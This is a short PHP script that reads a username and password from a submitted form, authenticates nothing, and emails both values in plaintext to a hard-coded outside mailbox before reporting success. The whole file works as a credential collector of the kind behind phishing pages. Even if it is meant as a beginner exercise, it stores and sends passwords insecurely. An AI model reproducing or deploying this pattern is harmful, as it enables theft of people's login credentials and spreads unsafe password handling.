<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Validate and sanitize the data (you can add more validation here)

    // Send form responses via email
    $to = "priyasha@umich.edu";
    $subject = "Form Submission";
    $message = "Username: " . htmlspecialchars($username) . "\nPassword: " . htmlspecialchars($password);
    $headers = "From: webmaster@example.com";

    // Send email
    mail($to, $subject, $message, $headers);

    echo "Form submitted successfully!";
} else {
    // Handle non-POST requests
    echo "Invalid request method.";
}
?>
